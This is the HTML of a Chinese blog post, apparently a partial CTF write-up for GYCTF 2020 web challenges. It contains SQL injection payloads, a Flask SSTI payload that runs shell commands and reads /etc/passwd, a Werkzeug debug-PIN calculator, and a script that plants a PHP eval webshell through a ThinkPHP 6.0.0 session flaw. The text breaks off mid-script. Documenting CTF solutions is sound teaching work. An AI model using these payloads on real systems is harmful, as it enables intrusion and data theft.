@@ -1,0 +1,1282 @@
+<!DOCTYPE html>
+<html>
+<head hexo-theme='https://github.com/volantis-x/hexo-theme-volantis/releases/tag/3.0.0'>
+  <meta charset="utf-8">
+  <!-- SEO相关 -->
+  
+    
+  
+  <!-- 渲染优化 -->
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <!-- 页面元数据 -->
+  
+  <title>新春战疫赛game-gyctf部分writeup - 明月归的小站</title>
+  
+    <meta name="keywords" content="writeup,ctf">
+  
+
+  
+    <meta name="description" content="本篇博客主要介绍了game-gyctf的部分writeup！">
+  
+
+  <!-- feed -->
+  
+
+  <!-- import meta -->
+  
+
+  <!-- link -->
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13/css/all.min.css">
+
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/l-lin/font-awesome-animation/dist/font-awesome-animation.min.css">
+
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
+
+  
+
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-waves@0.7.6/dist/waves.min.css">
+
+  
+
+  
+
+  
+
+  
+
+  <!-- import link -->
+  
+
+  
+  
+    
+<link rel="stylesheet" href="/css/style.css">
+
+  
+
+  
+  
+</head>
+
+<body>
+  
+  
+  
+  <div class="cover-wrapper">
+    <cover class='cover post' style="display: none;">
+      <div class='cover-body'>
+  <div class='a'>
+    
+    
+    
+  </div>
+  <div class='b'>
+    <div class='menu navigation dock'>
+      <div class='list-h'>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+      <div class="scroll-down" style="display: none;"><i class="fa fa-chevron-down scroll-down-effects"></i></div>
+    </cover>
+    <header class="l_header shadow blur">
+  <div class='container'>
+  <div class='wrapper'>
+    <div class='nav-sub'>
+      <p class="title"></p>
+      <ul class='switcher nav-list-h m-phone' id="pjax-header-nav-list">
+        <li><a class="s-comment fas fa-comments fa-fw" target="_self" href='javascript:void(0)'></a></li>
+        
+          <li><a class="s-toc fas fa-list fa-fw" target="_self" href='javascript:void(0)'></a></li>
+        
+      </ul>
+    </div>
+		<div class="nav-main">
+      
+        
+        <a class="title flat-box" target="_self" href='/'>
+          
+          
+          
+        </a>
+      
+
+			<div class='menu navigation'>
+				<ul class='nav-list-h m-pc'>
+          
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/
+                  
+                  
+                  
+                    id="home"
+                  >
+                  <i class='fas fa-rss fa-fw'></i>博客
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/archives/
+                  
+                  
+                  
+                    id="archives"
+                  >
+                  <i class='fas fa-archive fa-fw'></i>归档
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/tags/
+                  
+                  
+                  
+                    id="tags"
+                  >
+                  <i class='fas fa-tags fa-fw'></i>标签
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/friends/
+                  
+                  
+                  
+                    id="friends"
+                  >
+                  <i class='fas fa-link fa-fw'></i>友链
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/about/
+                  
+                  
+                  
+                    id="about"
+                  >
+                  <i class='fas fa-info-circle fa-fw'></i>关于
+                </a>
+                
+              </li>
+            
+          
+          
+				</ul>
+			</div>
+
+      <div class="m_search">
+        <form name="searchform" class="form u-search-form">
+          <i class="icon fas fa-search fa-fw"></i>
+          <input type="text" class="input u-search-input" placeholder="Search..." />
+        </form>
+      </div>
+
+			<ul class='switcher nav-list-h m-phone'>
+				
+					<li><a class="s-search fas fa-search fa-fw" target="_self" href='javascript:void(0)'></a></li>
+				
+				<li>
+          <a class="s-menu fas fa-bars fa-fw" target="_self" href='javascript:void(0)'></a>
+          <ul class="menu-phone list-v navigation white-box">
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/
+                  
+                  
+                  
+                    id="home"
+                  >
+                  <i class='fas fa-rss fa-fw'></i>博客
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/archives/
+                  
+                  
+                  
+                    id="archives"
+                  >
+                  <i class='fas fa-archive fa-fw'></i>归档
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/tags/
+                  
+                  
+                  
+                    id="tags"
+                  >
+                  <i class='fas fa-tags fa-fw'></i>标签
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/friends/
+                  
+                  
+                  
+                    id="friends"
+                  >
+                  <i class='fas fa-link fa-fw'></i>友链
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/about/
+                  
+                  
+                  
+                    id="about"
+                  >
+                  <i class='fas fa-info-circle fa-fw'></i>关于
+                </a>
+                
+              </li>
+            
+          
+            
+          </ul>
+        </li>
+			</ul>
+		</div>
+	</div>
+  </div>
+</header>
+
+  </div>
+  
+
+
+  <div class="l_body nocover">
+    <div class='body-wrapper' id="pjax-container">
+      
+        <!--此文件用来存放一些不方便取值的变量--> 
+<!--思路大概是将值藏到重加载的区域内--> 
+ 
+ 
+ 
+<div id="pjax-data" style="display: none"> 
+  <div id="pjax-ispage">true</div> 
+  <div id="pjax-pageTitle">新春战疫赛game-gyctf部分writeup</div> 
+  <div id="pjax-enable-cover">true</div> 
+  <div id="pjax-comment-path">none</div> 
+  <div id="pjax-comment-placeholder">none</div> 
+</div> 
+ 
+ 
+<script> 
+  // 处理封面 此时 jquery 还没加载 
+  if ("none" == "none") { // 移除封面 
+    document.getElementsByClassName('cover')[0].style.display = "none"; 
+    document.getElementsByClassName('l_body')[0].classList.add("nocover"); 
+    document.getElementsByClassName('l_header', 'cover-wrapper')[0].classList.add("show"); 
+  } else { 
+    if ("none" == "blog") { // 半屏 
+      document.getElementsByClassName('cover')[0].classList.remove("full"); 
+      document.getElementsByClassName('cover')[0].classList.add("half"); 
+      document.getElementsByClassName('scroll-down')[0].style.display = "none"; 
+    } else if ("none" == "docs") { // 全屏 
+      document.getElementsByClassName('cover')[0].classList.remove("half"); 
+      document.getElementsByClassName('cover')[0].classList.add("full"); 
+      document.getElementsByClassName('scroll-down')[0].style.display = ""; 
+    } 
+    document.getElementsByClassName('cover')[0].style.display = ""; 
+    document.getElementsByClassName('l_body', 'show')[0].classList.remove("nocover"); 
+    document.getElementsByClassName('l_header', 'cover-wrapper')[0].classList.remove("show"); 
+  } 
+</script> 
+
+      
+      
+
+<div class='l_main'>
+  
+
+  
+    <article id="post" class="post white-box reveal shadow article-type-post" itemscope itemprop="blogPost">
+      
+
+
+  <section class='meta'>
+    
+      
+      
+      <div class="meta" id="header-meta">
+        
+          
+  <h1 class="title">
+    <a href="/2020/02/21/%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E8%B5%9Bgame-gyctf%E9%83%A8%E5%88%86writeup/">
+      新春战疫赛game-gyctf部分writeup
+    </a>
+  </h1>
+
+
+        
+        <div class='new-meta-box'>
+          
+            
+          
+            
+              
+<div class='new-meta-item author'>
+  <a class='author' href="/" rel="nofollow">
+    <img no-lazy src="/pic/youxiang.jpg">
+    <p>MoonBack</p>
+  </a>
+</div>
+
+            
+          
+            
+              
+
+            
+          
+            
+              <div class="new-meta-item date">
+  <a class='notlink'>
+    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：2020年2月21日</p>
+  </a>
+</div>
+
+            
+          
+            
+              
+
+            
+          
+        </div>
+        
+          <hr>
+        
+      </div>
+    
+  </section>
+
+
+      <section class="article typo">
+        <div class="article-entry" itemprop="articleBody">
+          
+          
+          <p>本篇博客主要介绍了game-gyctf的部分writeup！</p>
+<a id="more"></a>
+
+<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="简单的招聘系统"><a href="#简单的招聘系统" class="headerlink" title="简单的招聘系统"></a>简单的招聘系统</h3><p>这题是是真的没想到！</p>
+<p>注册一个账号进去发现里面有个黑页，然后用admin万能密码成功登陆进去，看到黑页</p>
+<p>这个黑页不是漏洞点，漏洞点就在登陆上，可以直接联合查询，回显在登陆后的页面上</p>
+<p><strong>order by:</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39; order by 6#</span><br></pre></td></tr></table></figure>
+
+<p>登陆失败，说明有5列</p>
+<p><strong>判断回显位：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39; union select 1,2,3,4,5#</span><br></pre></td></tr></table></figure>
+
+<img src="/2020/02/21/%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E8%B5%9Bgame-gyctf%E9%83%A8%E5%88%86writeup/TIM截图20200221214528.png" style="zoom:67%;">
+
+<p>回显位为第二个</p>
+<p><strong>注数据库：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39; union select 1,group_concat(schema_name),3,4,5 from information_schema.schemata#</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/02/21/%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E8%B5%9Bgame-gyctf%E9%83%A8%E5%88%86writeup/TIM%E6%88%AA%E5%9B%BE20200221215121.png"></p>
+<p><strong>注表：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39; union select 1,group_concat(table_name),3,4,5 from information_schema.tables where table_schema&#x3D;database()#</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/02/21/%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E8%B5%9Bgame-gyctf%E9%83%A8%E5%88%86writeup/TIM%E6%88%AA%E5%9B%BE20200221215337.png"></p>
+<p><strong>注字段：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39; union select 1,group_concat(column_name),3,4,5 from information_schema.columns where table_name&#x3D;&quot;flag&quot;#</span><br></pre></td></tr></table></figure>
+
+<img src="/2020/02/21/%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E8%B5%9Bgame-gyctf%E9%83%A8%E5%88%86writeup/TIM截图20200221215558.png" style="zoom:80%;">
+
+<p><strong>注内容：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39; union select 1,group_concat(flaaag),3,4,5 from nzhaopin.flag#</span><br></pre></td></tr></table></figure>
+
+<img src="/2020/02/21/%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E8%B5%9Bgame-gyctf%E9%83%A8%E5%88%86writeup/TIM截图20200221215929.png" style="zoom:80%;">
+
+<p>据说三个地方都有注入，登陆，注册，黑页，我真是太菜了</p>
+<h3 id="easysqli-copy"><a href="#easysqli-copy" class="headerlink" title="easysqli_copy"></a>easysqli_copy</h3><h3 id="Ezsqli"><a href="#Ezsqli" class="headerlink" title="Ezsqli"></a>Ezsqli</h3><h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><h3 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h3><h3 id="blacklist"><a href="#blacklist" class="headerlink" title="blacklist"></a>blacklist</h3><p>看到立马想到了强网杯随便注</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;show tables;		#表为FlagHere</span><br><span class="line">1&#39;;desc FlagHere;	 #查看表结构，发现有flag字段</span><br></pre></td></tr></table></figure>
+
+<p>题目没有过滤handler，参见：</p>
+<p><a target="_blank" rel="noopener" href="https://dev.mysql.com/doc/refman/8.0/en/handler.html">https://dev.mysql.com/doc/refman/8.0/en/handler.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://skysec.top/2019/12/13/2019-FudanCTF-Writeup">https://skysec.top/2019/12/13/2019-FudanCTF-Writeup</a></p>
+<p>handler类似于select语句，但又不同于后者，它只能每次查询1次记录</p>
+<p>比如：通过handler语句查询users表的内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">handler users open as moonback; #指定数据表进行载入并将返回句柄别名</span><br><span class="line">handler moonback read first; 	#读取指定表&#x2F;句柄的首行数据</span><br><span class="line">handler moonback read next; 	#读取指定表&#x2F;句柄的下一行数据</span><br><span class="line">handler moonback read next; 	#读取指定表&#x2F;句柄的下一行数据</span><br><span class="line">...</span><br><span class="line">handler moonback close; #关闭句柄</span><br></pre></td></tr></table></figure>
+
+<p>所以我们就能查出flag</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;<span class="keyword">handler</span> FlagHere <span class="keyword">open</span> <span class="keyword">as</span> moonback;<span class="keyword">handler</span> moonback <span class="keyword">read</span> <span class="keyword">first</span>;</span><br><span class="line"><span class="comment"># 或者直接</span></span><br><span class="line">1&#x27;;<span class="keyword">handler</span> FlagHere <span class="keyword">open</span>;<span class="keyword">handler</span> FlagHere <span class="keyword">read</span> <span class="keyword">first</span>;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Flaskapp"><a href="#Flaskapp" class="headerlink" title="Flaskapp"></a>Flaskapp</h3><p>看名字猜测是和ssti沙箱逃逸相关内容</p>
+<h4 id="不读取pin码"><a href="#不读取pin码" class="headerlink" title="不读取pin码"></a>不读取pin码</h4><p>随便输一个字符让base64解密报错，可以看到部分源码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(&#x27;/decode&#x27;,methods=[&#x27;POST&#x27;,&#x27;GET&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span>():</span></span><br><span class="line">    <span class="keyword">if</span> request.values.get(<span class="string">&#x27;text&#x27;</span>) :</span><br><span class="line">        text = request.values.get(<span class="string">&quot;text&quot;</span>)</span><br><span class="line">        text_decode = base64.b64decode(text.encode())</span><br><span class="line">        tmp = <span class="string">&quot;结果 ： &#123;0&#125;&quot;</span>.format(text_decode.decode())</span><br><span class="line">        <span class="keyword">if</span> waf(tmp) :</span><br><span class="line">            flash(<span class="string">&quot;no no no !!&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;decode&#x27;</span>))</span><br><span class="line">        res =  render_template_string(tmp)</span><br></pre></td></tr></table></figure>
+
+<p>简单的将一些关键字base64编码后提交发现知识简单的过滤了关键字</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">request</span><br><span class="line">flag</span><br><span class="line">system</span><br><span class="line">popen</span><br><span class="line">import</span><br><span class="line">__import__</span><br><span class="line">importlib</span><br><span class="line">eval</span><br><span class="line">os</span><br><span class="line">subprocess</span><br></pre></td></tr></table></figure>
+
+<p>因此我们可以直接改下：<a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/tree/master/flask/ssti%E7%9A%84exp">https://github.com/vulhub/vulhub/tree/master/flask/ssti的exp</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__ == <span class="string">&#x27;catch_warnings&#x27;</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">for</span> b <span class="keyword">in</span> c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% <span class="keyword">if</span> b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> <span class="string">&#x27;ev&#x27;</span>+<span class="string">&#x27;al&#x27;</span> <span class="keyword">in</span> b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[<span class="string">&#x27;ev&#x27;</span>+<span class="string">&#x27;al&#x27;</span>](<span class="string">&#x27;__imp&#x27;</span>+<span class="string">&#x27;ort__(&quot;o&quot;+&quot;s&quot;).po&#x27;</span>+<span class="string">&#x27;pen(&quot;cat this_is_the_fl&quot;+&quot;ag.txt&quot;).read()&#x27;</span>) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+<p>将过滤的东西拼接到一块就能执行命令得到flag了</p>
+<h4 id="读取pin码"><a href="#读取pin码" class="headerlink" title="读取pin码"></a>读取pin码</h4><p>先介绍一下pin码，flask项目运行时开启debug模式时会生成一个由当前环境的pin码，类似于：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">123-123-123</span><br></pre></td></tr></table></figure>
+
+<p>也就是说在某个特定环境下pin码是不变的</p>
+<p>输入正确的pin码我们就可以进入debug页面，然后输入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;console</span><br></pre></td></tr></table></figure>
+
+<p>可以进入python交互式shell</p>
+<p>关于pin码详细介绍参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2553">https://xz.aliyun.com/t/2553</a></p>
+<p>我们需要知道6个值：</p>
+<ol>
+<li><code>username</code>，为启动flask的用户</li>
+<li><code>modname</code>，为flask.app</li>
+<li><code>getattr(app, &#39;__name__&#39;, getattr(app.__class__, &#39;__name__&#39;))</code>，为Flask</li>
+<li><code>getattr(mod, &#39;__file__&#39;, None)</code>，flask包目录下的app.py的绝对路径，报错可以爆出来</li>
+<li><code>uuid.getnode()</code> ，mac地址十进制</li>
+<li><code>get_machine_id()</code>，/etc/machine-id</li>
+</ol>
+<p>知道这6个值我们就可以用大佬脚本跑出来pin码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;kingkk&#x27;</span>,<span class="comment"># username	/etc/passwd</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,<span class="comment"># modname</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,<span class="comment"># getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span></span><br><span class="line">    <span class="string">&#x27;/home/kingkk/.local/lib/python3.5/site-packages/flask/app.py&#x27;</span> <span class="comment"># getattr(mod, &#x27;__file__&#x27;, None),报错可以爆出来</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;52242498922&#x27;</span>,<span class="comment"># str(uuid.getnode()),  /sys/class/net/ens33/address</span></span><br><span class="line">    <span class="string">&#x27;19949f18ce36422da1402b3e3fe53008&#x27;</span><span class="comment"># get_machine_id(), /etc/machine-id或者/proc/self/cgroup或/proc/sys/kernel/random/boot_i或注册表SOFTWARE\\Microsoft\\Cryptography值</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(bit, str):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % int(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> len(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>, len(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line">print(rv)</span><br></pre></td></tr></table></figure>
+
+<p>可以用下面的payload读取文件：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;</span><br><span class="line">&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].open(<span class="string">&#x27;/etc/passwd&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).read() &#125;&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+<p>从<code>/etc/passwd</code>可以看到有个<code>flaskweb</code>的用户，尝试着用下</p>
+<p>读取<code>/proc/self/cgroup</code>，注意在docker环境中不要读<code>/etc/machine-id</code></p>
+<img src="/2020/02/21/%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E8%B5%9Bgame-gyctf%E9%83%A8%E5%88%86writeup/TIM截图20200225121213.png" style="zoom:80%;">
+
+<p>读取<code>/sys/class/net/eth0/address</code>获得mac地址<code>02:42:ac:12:00:04</code>，十进制表达式是<code>2485377957892</code></p>
+<p>从报错中看到可以看到绝对路径为<code>/usr/local/lib/python3.7/site-packages/flask/app.py</code></p>
+<p>将对应内容填入运行就能得到pin,我这里是<code>922-522-604</code></p>
+<img src="/2020/02/21/%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E8%B5%9Bgame-gyctf%E9%83%A8%E5%88%86writeup/TIM截图20200225122919.png" style="zoom:80%;">
+
+<h3 id="easy-thinking"><a href="#easy-thinking" class="headerlink" title="easy_thinking"></a>easy_thinking</h3><p>访问<code>www.zip</code>，有源码，题目考察的是thinkphp6.0.0最新的session的漏洞</p>
+<p>参考：</p>
+<p><a target="_blank" rel="noopener" href="https://www.uedbox.com/post/65126/">https://www.uedbox.com/post/65126/</a></p>
+<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/1114/#_1">https://paper.seebug.org/1114/#_1</a></p>
+<p>报错可以看出版本信息</p>
+<img src="/2020/02/21/%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E8%B5%9Bgame-gyctf%E9%83%A8%E5%88%86writeup/TIM截图20200225142134.png" style="zoom:80%;">
+
+<p>先介绍一下TP框架的路由规则</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F; index.php  &#x2F;Index    &#x2F;Index   &#x2F;index</span><br><span class="line">   入口文件   模块(前台)  控制器    方法</span><br></pre></td></tr></table></figure>
+
+<p>本题的利用方式：</p>
+<ol>
+<li>先正常注册一个账号</li>
+<li>登陆时抓包将sessid改成<code>.php</code>结尾，长度必须是32位</li>
+<li>然后去搜索处输入东西，来到个人中心看搜索历史，这些搜索历史都保存在<code>/runtime/session/</code>目录内</li>
+</ol>
+<p>写了个脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://182.92.243.154:7893/&#x27;</span></span><br><span class="line">s=requests.session()</span><br><span class="line">data=&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;moon&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;back&quot;</span>&#125;</span><br><span class="line">headers=&#123;</span><br><span class="line">	<span class="string">&quot;Cookie&quot;</span>:<span class="string">&quot;PHPSESSID=1433223143322314332231433223.php&quot;</span></span><br><span class="line">	&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">req</span>():</span></span><br><span class="line">	s.get(url)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span>(<span class="params">data</span>):</span></span><br><span class="line">	s.post(url+<span class="string">&quot;home/member/register&quot;</span>,data=data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>(<span class="params">data</span>):</span></span><br><span class="line">	s.post(url+<span class="string">&#x27;home/member/login&#x27;</span>,data=data,headers=headers)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search</span>():</span></span><br><span class="line">	data1=&#123;<span class="string">&quot;key&quot;</span>:<span class="string">&quot;&lt;?php eval($_POST[1]);?&gt;&quot;</span>&#125;</span><br><span class="line">	s.post(url+<span class="string">&#x27;home/member/search&#x27;</span>,data=data1,headers=headers)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">backdoor</span>():</span></span><br><span class="line">	data2=&#123;<span class="string">&quot;1&quot;</span>:<span class="string">&quot;echo &#x27;hacker!&#x27;;&quot;</span>&#125;</span><br><span class="line">	r=requests.post(url+<span class="string">&quot;runtime/session/sess_1433223143322314332231433223.php&quot;</span>,data=data2)</span><br><span class="line">	<span class="keyword">if</span> <span class="string">&quot;hacker&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">		print(<span class="string">&quot;[+] vulnerable!!!&quot;</span>)</span><br><span 